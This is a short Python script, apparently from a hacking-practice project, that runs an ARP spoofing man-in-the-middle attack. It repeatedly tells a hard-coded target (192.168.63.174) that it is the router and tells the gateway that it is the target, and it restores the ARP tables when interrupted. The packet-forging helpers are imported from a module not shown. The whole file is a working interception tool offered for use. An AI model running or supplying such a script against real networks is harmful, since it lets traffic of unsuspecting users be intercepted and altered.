#/usr/bin/env python
from __future__ import print_function # mitigate syntax error from using *end=""*
import time
import sys
from utils.scapy_utils import spoof, get_mac, check_port_forwarding, restore

target_ip = "192.168.63.174"
gateway_ip = "192.168.63.2"

check_port_forwarding()

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip,gateway_ip, get_mac) # Tell the Target Device I am the Router.
        spoof(gateway_ip,target_ip, get_mac) # Tell the Router I am the Target Device.
        sent_packets_count += 2
        print("\r[+] Packets set: " + str(sent_packets_count), end=""), # Use ,end="" for python 3
        sys.stdout.flush()
        time.sleep(2) # Can quit by pressing Ctrl+c
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ... Resetting ARM tables..... Please wait.\n")
    restore(target_ip, gateway_ip, get_mac)
    restore(gateway_ip, target_ip, get_mac)
